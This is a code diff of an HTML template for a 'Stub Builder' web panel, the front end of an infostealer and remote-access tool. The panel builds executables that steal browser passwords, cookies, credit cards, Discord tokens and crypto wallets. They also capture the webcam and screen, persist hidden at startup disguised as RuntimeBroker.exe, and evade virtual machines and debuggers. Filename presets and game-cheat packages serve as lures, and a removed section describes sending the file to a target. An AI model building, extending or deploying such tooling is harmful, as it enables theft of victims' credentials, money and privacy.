@@ -4,70 +4,156 @@
 
 {% block extra_css %}
 <style>
-    .generator-card {
+    .builder-container {
+        display: grid;
+        grid-template-columns: 1fr 350px;
+        gap: 25px;
+    }
+
+    .build-card {
         background: linear-gradient(135deg, #1a1a25, #12121a);
         border: 2px solid var(--purple-primary);
         border-radius: 20px;
         padding: 30px;
-        margin-bottom: 30px;
     }
 
-    .generator-card h3 {
+    .build-card h3 {
         color: var(--purple-light);
         margin-bottom: 20px;
-    }
-
-    .name-presets {
         display: flex;
-        flex-wrap: wrap;
+        align-items: center;
         gap: 10px;
-        margin-bottom: 20px;
     }
 
-    .preset-btn {
-        padding: 10px 20px;
+    .option-group {
+        margin-bottom: 25px;
+    }
+
+    .option-group h4 {
+        color: var(--text-secondary);
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin-bottom: 15px;
+        padding-bottom: 10px;
+        border-bottom: 1px solid var(--border-color);
+    }
+
+    .toggle-option {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 12px 15px;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: 10px;
+        margin-bottom: 10px;
+        transition: all 0.2s;
+    }
+
+    .toggle-option:hover {
+        border-color: var(--purple-primary);
+    }
+
+    .toggle-option .info {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .toggle-option .info i {
+        font-size: 18px;
+        color: var(--purple-light);
+        width: 24px;
+        text-align: center;
+    }
+
+    .toggle-option .info span {
+        font-size: 14px;
+    }
+
+    .toggle-option .info small {
+        display: block;
+        font-size: 11px;
+        color: var(--text-muted);
+        margin-top: 2px;
+    }
+
+    .toggle-switch {
+        position: relative;
+        width: 50px;
+        height: 26px;
+    }
+
+    .toggle-switch input {
+        opacity: 0;
+        width: 0;
+        height: 0;
+    }
+
+    .toggle-slider {
+        position: absolute;
+        cursor: pointer;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 26px;
+        transition: 0.3s;
+    }
+
+    .toggle-slider:before {
+        position: absolute;
+        content: "";
+        height: 20px;
+        width: 20px;
+        left: 3px;
+        bottom: 2px;
+        background: white;
+        border-radius: 50%;
+        transition: 0.3s;
+    }
+
+    input:checked + .toggle-slider {
+        background: var(--purple-primary);
+        border-color: var(--purple-primary);
+    }
+
+    input:checked + .toggle-slider:before {
+        transform: translateX(22px);
+    }
+
+    .filename-input {
+        margin-top: 20px;
+    }
+
+    .filename-input label {
+        display: block;
+        font-size: 12px;
+        color: var(--text-secondary);
+        margin-bottom: 8px;
+    }
+
+    .filename-input input {
+        width: 100%;
+        padding: 12px 15px;
         background: var(--bg-secondary);
         border: 1px solid var(--border-color);
         border-radius: 10px;
         color: var(--text-primary);
-        cursor: pointer;
-        transition: all 0.2s;
+        font-size: 14px;
     }
 
-    .preset-btn:hover {
-        border-color: var(--purple-primary);
-        background: var(--bg-hover);
-    }
-
-    .preset-btn.selected {
-        border-color: var(--purple-primary);
-        background: rgba(147, 51, 234, 0.2);
-    }
-
-    .custom-name-input {
-        display: flex;
-        gap: 15px;
-        align-items: center;
-        margin-top: 20px;
-    }
-
-    .custom-name-input input {
-        flex: 1;
-        padding: 15px 20px;
-        background: var(--bg-secondary);
-        border: 1px solid var(--border-color);
-        border-radius: 12px;
-        color: var(--text-primary);
-        font-size: 16px;
-    }
-
-    .custom-name-input input:focus {
+    .filename-input input:focus {
         outline: none;
         border-color: var(--purple-primary);
     }
 
-    .download-btn {
-        padding: 15px 40px;
+    .build-btn {
+        width: 100%;
+        padding: 18px;
         background: linear-gradient(135deg, var(--purple-primary), var(--purple-dark));
         border: none;
         border-radius: 12px;
@@ -76,64 +162,160 @@
         font-weight: 600;
         cursor: pointer;
         transition: all 0.3s;
-        display: inline-flex;
+        margin-top: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+
+    .build-btn:hover {
+        box-shadow: 0 10px 30px rgba(147, 51, 234, 0.4);
+        transform: translateY(-2px);
+    }
+
+    .preview-card {
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: 15px;
+        padding: 20px;
+        position: sticky;
+        top: 20px;
+    }
+
+    .preview-card h4 {
+        margin-bottom: 20px;
+        display: flex;
         align-items: center;
         gap: 10px;
     }
 
-    .download-btn:hover {
-        box-shadow: 0 8px 25px rgba(147, 51, 234, 0.4);
-        transform: translateY(-2px);
+    .preview-item {
+        display: flex;
+        justify-content: space-between;
+        padding: 10px 0;
+        border-bottom: 1px solid var(--border-color);
+        font-size: 13px;
     }
 
-    .preview-name {
-        margin-top: 15px;
-        padding: 15px 20px;
-        background: var(--bg-primary);
-        border-radius: 10px;
-        font-family: monospace;
-        font-size: 14px;
-        color: var(--success);
+    .preview-item:last-child {
+        border-bottom: none;
+    }
+
+    .preview-item .label {
+        color: var(--text-muted);
+    }
+
+    .preview-item .value {
+        color: var(--text-primary);
+        font-weight: 500;
+    }
+
+    .preview-item .value.enabled {
+        color: #22c55e;
+    }
+
+    .preview-item .value.disabled {
+        color: #ef4444;
+    }
+
+    .preset-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 10px;
+        margin-bottom: 20px;
+    }
+
+    .preset-btn {
+        padding: 10px;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: 8px;
+        color: var(--text-primary);
+        cursor: pointer;
+        font-size: 11px;
+        text-align: center;
+        transition: all 0.2s;
+    }
+
+    .preset-btn:hover {
+        border-color: var(--purple-primary);
+        background: rgba(147, 51, 234, 0.1);
+    }
+
+    .preset-btn.selected {
+        border-color: var(--purple-primary);
+        background: rgba(147, 51, 234, 0.2);
+    }
+
+    .cheat-section {
+        margin-top: 30px;
+    }
+
+    .cheat-grid {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 15px;
     }
 
     .cheat-card {
         display: flex;
         align-items: center;
         gap: 15px;
-        padding: 20px;
+        padding: 15px;
         background: var(--bg-secondary);
         border: 1px solid var(--border-color);
-        border-radius: 15px;
+        border-radius: 12px;
+        text-decoration: none;
         transition: all 0.3s;
-        cursor: pointer;
     }
 
     .cheat-card:hover {
         border-color: var(--purple-primary);
-        transform: translateY(-3px);
-        box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        transform: translateY(-2px);
     }
 
     .cheat-icon {
-        width: 50px;
-        height: 50px;
-        border-radius: 12px;
+        width: 45px;
+        height: 45px;
+        border-radius: 10px;
         display: flex;
         align-items: center;
         justify-content: center;
-        font-size: 22px;
+        font-size: 20px;
         color: white;
     }
 
-    .cheat-info h4 {
+    .cheat-info h5 {
         color: var(--text-primary);
-        margin: 0 0 5px 0;
-        font-size: 15px;
+        margin: 0 0 3px 0;
+        font-size: 14px;
     }
 
     .cheat-info span {
         color: var(--text-muted);
-        font-size: 12px;
+        font-size: 11px;
+    }
+
+    .api-box {
+        margin-top: 25px;
+        padding: 15px;
+        background: var(--bg-primary);
+        border-radius: 10px;
+    }
+
+    .api-box label {
+        display: block;
+        font-size: 11px;
+        color: var(--text-muted);
+        margin-bottom: 8px;
+    }
+
+    .api-box code {
+        display: block;
+        font-size: 11px;
+        word-break: break-all;
+        color: var(--purple-light);
     }
 </style>
 {% endblock %}
@@ -154,151 +336,341 @@
 
 <main class="main-content">
     <div class="header">
-        <h2><i class="fas fa-hammer"></i> Stub Generator</h2>
+        <h2><i class="fas fa-hammer"></i> Stub Builder</h2>
     </div>
 
-    <!-- Generator -->
-    <div class="generator-card">
-        <h3><i class="fas fa-download"></i> Generate & Download Stub</h3>
-        <p style="color: var(--text-secondary); margin-bottom: 20px;">
-            Choose a name for your executable or use one of the presets. The stub will automatically send data to your panel.
-        </p>
+    <div class="builder-container">
+        <div>
+            <form id="buildForm" action="/builder/build" method="POST">
+                <div class="build-card">
+                    <h3><i class="fas fa-cog"></i> Build Configuration</h3>
 
-        <h4 style="margin-bottom: 15px; color: var(--text-secondary);">Quick Presets:</h4>
-        <div class="name-presets">
-            <button class="preset-btn" onclick="setName('WindowsUpdate')">Windows Update</button>
-            <button class="preset-btn" onclick="setName('ChromeSetup')">Chrome Setup</button>
-            <button class="preset-btn" onclick="setName('DiscordSetup')">Discord Setup</button>
-            <button class="preset-btn" onclick="setName('SpotifyInstaller')">Spotify Installer</button>
-            <button class="preset-btn" onclick="setName('SteamSetup')">Steam Setup</button>
-            <button class="preset-btn" onclick="setName('MinecraftInstaller')">Minecraft Installer</button>
-            <button class="preset-btn" onclick="setName('FortniteCheat')">Fortnite Cheat</button>
-            <button class="preset-btn" onclick="setName('FreeVbucks')">Free Vbucks</button>
-            <button class="preset-btn" onclick="setName('NitroGenerator')">Nitro Generator</button>
-            <button class="preset-btn" onclick="setName('CrackActivator')">Crack Activator</button>
-            <button class="preset-btn" onclick="setName('PhotoshopCrack')">Photoshop Crack</button>
-            <button class="preset-btn" onclick="setName('OfficeActivator')">Office Activator</button>
+                    <!-- Grabber Options -->
+                    <div class="option-group">
+                        <h4><i class="fas fa-download"></i> Data Grabbing</h4>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-key"></i>
+                                <div>
+                                    <span>Passwords</span>
+                                    <small>Grab saved passwords from browsers</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="passwords" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-cookie"></i>
+                                <div>
+                                    <span>Cookies</span>
+                                    <small>Grab browser cookies (session hijacking)</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="cookies" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-credit-card"></i>
+                                <div>
+                                    <span>Credit Cards</span>
+                                    <small>Grab saved payment methods</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="cards" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fab fa-discord"></i>
+                                <div>
+                                    <span>Discord Tokens</span>
+                                    <small>Grab Discord account tokens</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="tokens" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fab fa-bitcoin"></i>
+                                <div>
+                                    <span>Crypto Wallets</span>
+                                    <small>Detect wallet extensions & apps</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="wallets" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-camera"></i>
+                                <div>
+                                    <span>Screenshot</span>
+                                    <small>Capture desktop screenshot</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="screenshot" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <!-- Remote Control -->
+                    <div class="option-group">
+                        <h4><i class="fas fa-gamepad"></i> Remote Control</h4>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-video"></i>
+                                <div>
+                                    <span>Webcam Access</span>
+                                    <small>Enable remote webcam capture</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="webcam" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-mouse"></i>
+                                <div>
+                                    <span>Mouse Control</span>
+                                    <small>Remote mouse click & move</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="mouse" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <!-- Stealth Options -->
+                    <div class="option-group">
+                        <h4><i class="fas fa-user-secret"></i> Stealth & Persistence</h4>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-sync"></i>
+                                <div>
+                                    <span>Auto-Start</span>
+                                    <small>Run on Windows startup (hidden)</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="startup" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-exclamation-triangle"></i>
+                                <div>
+                                    <span>Fake Error</span>
+                                    <small>Show fake error message on run</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="fake_error">
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-fire"></i>
+                                <div>
+                                    <span>Melt File</span>
+                                    <small>Delete exe after execution</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="melt">
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-shield-alt"></i>
+                                <div>
+                                    <span>Anti-VM</span>
+                                    <small>Exit if running in virtual machine</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="anti_vm" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+
+                        <div class="toggle-option">
+                            <div class="info">
+                                <i class="fas fa-bug"></i>
+                                <div>
+                                    <span>Anti-Debug</span>
+                                    <small>Exit if debugger detected</small>
+                                </div>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" name="anti_debug" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <!-- Filename -->
+                    <div class="filename-input">
+                        <label>Output Filename</label>
+                        <div class="preset-grid">
+                            <button type="button" class="preset-btn" onclick="setFilename('WindowsUpdate')">Windows Update</button>
+                            <button type="button" class="preset-btn" onclick="setFilename('RuntimeBroker')">RuntimeBroker</button>
+                            <button type="button" class="preset-btn" onclick="setFilename('ChromeSetup')">Chrome Setup</button>
+                            <button type="button" class="preset-btn" onclick="setFilename('DiscordSetup')">Discord Setup</button>
+                            <button type="button" class="preset-btn" onclick="setFilename('FortniteCheat')">Fortnite Cheat</button>
+                            <button type="button" class="preset-btn" onclick="setFilename('NitroGen')">Nitro Generator</button>
+                        </div>
+                        <input type="text" name="filename" id="filename" placeholder="Enter filename (without .exe)" value="setup">
+                    </div>
+
+                    <button type="submit" class="build-btn">
+                        <i class="fas fa-hammer"></i> Build & Download
+                    </button>
+
+                    <div class="api-box">
+                        <label>Your API Endpoint</label>
+                        <code>{{ api_url }}</code>
+                    </div>
+                </div>
+            </form>
+
+            <!-- Pre-built Cheats -->
+            <div class="cheat-section">
+                <h3 style="margin-bottom: 20px;"><i class="fas fa-gamepad"></i> Pre-Built Cheat Packages</h3>
+                <div class="cheat-grid">
+                    <a href="/builder/cheat/fivem" class="cheat-card">
+                        <div class="cheat-icon" style="background: linear-gradient(135deg, #ff6b35, #f7931e);"><i class="fas fa-car"></i></div>
+                        <div class="cheat-info"><h5>FiveM External</h5><span>Aimbot + ESP + GodMode</span></div>
+                    </a>
+                    <a href="/builder/cheat/fortnite" class="cheat-card">
+                        <div class="cheat-icon" style="background: linear-gradient(135deg, #00d4ff, #0099ff);"><i class="fas fa-crosshairs"></i></div>
+                        <div class="cheat-info"><h5>Fortnite Softaim</h5><span>Softaim + ESP + Radar</span></div>
+                    </a>
+                    <a href="/builder/cheat/roblox" class="cheat-card">
+                        <div class="cheat-icon" style="background: linear-gradient(135deg, #ff0000, #cc0000);"><i class="fas fa-cube"></i></div>
+                        <div class="cheat-info"><h5>Synapse X Cracked</h5><span>Roblox Executor</span></div>
+                    </a>
+                    <a href="/builder/cheat/minecraft" class="cheat-card">
+                        <div class="cheat-icon" style="background: linear-gradient(135deg, #5d8c3e, #3d5c28);"><i class="fas fa-cube"></i></div>
+                        <div class="cheat-info"><h5>Wurst Client</h5><span>Minecraft Hacked Client</span></div>
+                    </a>
+                    <a href="/builder/cheat/valorant" class="cheat-card">
+                        <div class="cheat-icon" style="background: linear-gradient(135deg, #ff4655, #0f1923);"><i class="fas fa-bullseye"></i></div>
+                        <div class="cheat-info"><h5>Valorant External</h5><span>Aimbot + ESP + Spoofer</span></div>
+                    </a>
+                    <a href="/builder/cheat/csgo" class="cheat-card">
+                        <div class="cheat-icon" style="background: linear-gradient(135deg, #f0b232, #de9b35);"><i class="fas fa-bomb"></i></div>
+                        <div class="cheat-info"><h5>CS2 External</h5><span>Legit + Rage + Skins</span></div>
+                    </a>
+                </div>
+            </div>
         </div>
 
-        <h4 style="margin-bottom: 15px; color: var(--text-secondary);">Or enter custom name:</h4>
-        <div class="custom-name-input">
-            <input type="text" id="stubName" placeholder="Enter filename (without .exe)" value="setup" oninput="updatePreview()">
-            <a id="downloadLink" href="/builder/download?name=setup" class="download-btn">
-                <i class="fas fa-download"></i> Download .exe
-            </a>
-        </div>
+        <!-- Preview Panel -->
+        <div>
+            <div class="preview-card">
+                <h4><i class="fas fa-eye"></i> Build Preview</h4>
 
-        <div class="preview-name">
-            <i class="fas fa-file"></i> Output: <span id="previewName">setup.exe</span>
-        </div>
-    </div>
+                <div class="preview-item">
+                    <span class="label">Filename</span>
+                    <span class="value" id="previewName">setup.exe</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Passwords</span>
+                    <span class="value enabled" id="prevPwd">Enabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Cookies</span>
+                    <span class="value enabled" id="prevCookies">Enabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Credit Cards</span>
+                    <span class="value enabled" id="prevCards">Enabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Discord Tokens</span>
+                    <span class="value enabled" id="prevTokens">Enabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Crypto Wallets</span>
+                    <span class="value enabled" id="prevWallets">Enabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Screenshot</span>
+                    <span class="value enabled" id="prevScreen">Enabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Webcam</span>
+                    <span class="value enabled" id="prevWebcam">Enabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Mouse Control</span>
+                    <span class="value enabled" id="prevMouse">Enabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Auto-Start</span>
+                    <span class="value enabled" id="prevStartup">Enabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Fake Error</span>
+                    <span class="value disabled" id="prevError">Disabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Melt File</span>
+                    <span class="value disabled" id="prevMelt">Disabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Anti-VM</span>
+                    <span class="value enabled" id="prevAntiVM">Enabled</span>
+                </div>
+                <div class="preview-item">
+                    <span class="label">Anti-Debug</span>
+                    <span class="value enabled" id="prevAntiDebug">Enabled</span>
+                </div>
 
-    <!-- Cheat Packages -->
-    <div class="table-container" style="padding: 25px; margin-bottom: 30px;">
-        <h3 style="margin-bottom: 20px;"><i class="fas fa-gamepad"></i> Ready-to-Send Cheat Packages</h3>
-        <p style="color: var(--text-secondary); margin-bottom: 20px;">
-            Download complete cheat folders with README, configs, and the stub inside. Just extract and send!
-        </p>
-
-        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
-            <a href="/builder/cheat/fivem" class="cheat-card" style="text-decoration: none;">
-                <div class="cheat-icon" style="background: linear-gradient(135deg, #ff6b35, #f7931e);">
-                    <i class="fas fa-car"></i>
+                <div style="margin-top: 20px; padding: 15px; background: rgba(147, 51, 234, 0.1); border-radius: 10px;">
+                    <div style="font-size: 12px; color: var(--text-muted);">Process Disguise</div>
+                    <div style="font-size: 14px; color: var(--purple-light); margin-top: 5px;">
+                        <i class="fas fa-shield-alt"></i> RuntimeBroker.exe
+                    </div>
+                    <div style="font-size: 11px; color: var(--text-muted); margin-top: 5px;">
+                        Hidden in AppData\Microsoft\
+                    </div>
                 </div>
-                <div class="cheat-info">
-                    <h4>FiveM External</h4>
-                    <span>Aimbot + ESP + GodMode</span>
-                </div>
-            </a>
-
-            <a href="/builder/cheat/fortnite" class="cheat-card" style="text-decoration: none;">
-                <div class="cheat-icon" style="background: linear-gradient(135deg, #00d4ff, #0099ff);">
-                    <i class="fas fa-crosshairs"></i>
-                </div>
-                <div class="cheat-info">
-                    <h4>Fortnite Softaim</h4>
-                    <span>Softaim + ESP + Radar</span>
-                </div>
-            </a>
-
-            <a href="/builder/cheat/roblox" class="cheat-card" style="text-decoration: none;">
-                <div class="cheat-icon" style="background: linear-gradient(135deg, #ff0000, #cc0000);">
-                    <i class="fas fa-cube"></i>
-                </div>
-                <div class="cheat-info">
-                    <h4>Synapse X Cracked</h4>
-                    <span>Roblox Executor</span>
-                </div>
-            </a>
-
-            <a href="/builder/cheat/minecraft" class="cheat-card" style="text-decoration: none;">
-                <div class="cheat-icon" style="background: linear-gradient(135deg, #5d8c3e, #3d5c28);">
-                    <i class="fas fa-cube"></i>
-                </div>
-                <div class="cheat-info">
-                    <h4>Wurst Client</h4>
-                    <span>Minecraft Hacked Client</span>
-                </div>
-            </a>
-
-            <a href="/builder/cheat/valorant" class="cheat-card" style="text-decoration: none;">
-                <div class="cheat-icon" style="background: linear-gradient(135deg, #ff4655, #0f1923);">
-                    <i class="fas fa-bullseye"></i>
-                </div>
-                <div class="cheat-info">
-                    <h4>Valorant External</h4>
-                    <span>Aimbot + ESP + Spoofer</span>
-                </div>
-            </a>
-
-            <a href="/builder/cheat/csgo" class="cheat-card" style="text-decoration: none;">
-                <div class="cheat-icon" style="background: linear-gradient(135deg, #f0b232, #de9b35);">
-                    <i class="fas fa-bomb"></i>
-                </div>
-                <div class="cheat-info">
-                    <h4>CS2 External</h4>
-                    <span>Legit + Rage + Skins</span>
-                </div>
-            </a>
-        </div>
-    </div>
-
-    <!-- Info -->
-    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
-        <div class="table-container" style="padding: 25px;">
-            <h3 style="margin-bottom: 15px;"><i class="fas fa-info-circle"></i> How it works</h3>
-            <ol style="color: var(--text-secondary); line-height: 2; padding-left: 20px;">
-                <li>Choose a convincing filename</li>
-                <li>Download the .exe</li>
-                <li>Send it to your target</li>
-                <li>When they run it, their data appears in your Dashboard</li>
-                <li>Control their PC remotely (screenshots, commands, files)</li>
-            </ol>
-        </div>
-
-        <div class="table-container" style="padding: 25px;">
-            <h3 style="margin-bottom: 15px;"><i class="fas fa-shield-alt"></i> Features</h3>
-            <ul style="color: var(--text-secondary); line-height: 2; padding-left: 20px;">
-                <li>✅ Grabs passwords, cookies, cards</li>
-                <li>✅ Steals Discord tokens</li>
-                <li>✅ Finds crypto wallets</li>
-                <li>✅ Takes screenshots</li>
-                <li>✅ Runs commands remotely</li>
-                <li>✅ Executes files you send</li>
-                <li>✅ Persists on reboot</li>
-            </ul>
-        </div>
-    </div>
-
-    <!-- API Info -->
-    <div class="table-container" style="padding: 25px; margin-top: 20px;">
-        <h3 style="margin-bottom: 15px;"><i class="fas fa-link"></i> Your API Endpoint</h3>
-        <p style="color: var(--text-secondary); margin-bottom: 10px;">This stub is configured to send data to:</p>
-        <div style="background: var(--bg-secondary); padding: 15px; border-radius: 10px; display: flex; align-items: center; gap: 10px;">
-            <code style="flex: 1; font-size: 13px; word-break: break-all;">{{ api_url }}</code>
-            <button class="btn btn-primary btn-sm" onclick="copyToClipboard('{{ api_url }}', this)">
-                <i class="fas fa-copy"></i>
-            </button>
+            </div>
         </div>
     </div>
 </main>
@@ -306,31 +678,54 @@
 
 {% block extra_js %}
 <script>
-    function setName(name) {
-        document.getElementById('stubName').value = name;
-        updatePreview();
-
-        // Highlight selected
-        document.querySelectorAll('.preset-btn').forEach(btn => btn.classList.remove('selected'));
-        event.target.classList.add('selected');
-    }
-
+    // Update preview
     function updatePreview() {
-        let name = document.getElementById('stubName').value.trim();
-        if (!name) name = 'setup';
+        // Filename
+        const filename = document.getElementById('filename').value || 'setup';
+        document.getElementById('previewName').textContent = filename + '.exe';
 
-        // Sanitize
-        name = name.replace(/[^a-zA-Z0-9_\- ]/g, '');
+        // Toggles
+        const toggles = {
+            'passwords': 'prevPwd',
+            'cookies': 'prevCookies',
+            'cards': 'prevCards',
+            'tokens': 'prevTokens',
+            'wallets': 'prevWallets',
+            'screenshot': 'prevScreen',
+            'webcam': 'prevWebcam',
+            'mouse': 'prevMouse',
+            'startup': 'prevStartup',
+            'fake_error': 'prevError',
+            'melt': 'prevMelt',
+            'anti_vm': 'prevAntiVM',
+            'anti_debug': 'prevAntiDebug'
+        };
 
-        document.getElementById('previewName').textContent = name + '.exe';
-        document.getElementById('downloadLink').href = '/builder/download?name=' + encodeURIComponent(name);
+        for (const [name, previewId] of Object.entries(toggles)) {
+            const checkbox = document.querySelector(`input[name="${name}"]`);
+            const preview = document.getElementById(previewId);
+            if (checkbox && preview) {
+                preview.textContent = checkbox.checked ? 'Enabled' : 'Disabled';
+                preview.className = 'value ' + (checkbox.checked ? 'enabled' : 'disabled');
+            }
+        }
     }
 
-    function copyToClipboard(text, btn) {
-        navigator.clipboard.writeText(text);
-        const original = btn.innerHTML;
-        btn.innerHTML = '<i class="fas fa-check"></i>';
-        setTimeout(() => btn.innerHTML = original, 1500);
+    // Set filename
+    function setFilename(name) {
+        document.getElementById('filename').value = name;
+        document.querySelectorAll('.preset-btn').forEach(b => b.classList.remove('selected'));
+        event.target.classList.add('selected');
+        updatePreview();
     }
+
+    // Listen to changes
+    document.querySelectorAll('input').forEach(input => {
+        input.addEventListener('change', updatePreview);
+        input.addEventListener('input', updatePreview);
+    });
+
+    // Initial update
+    updatePreview();
 </script>
 {% endblock %}
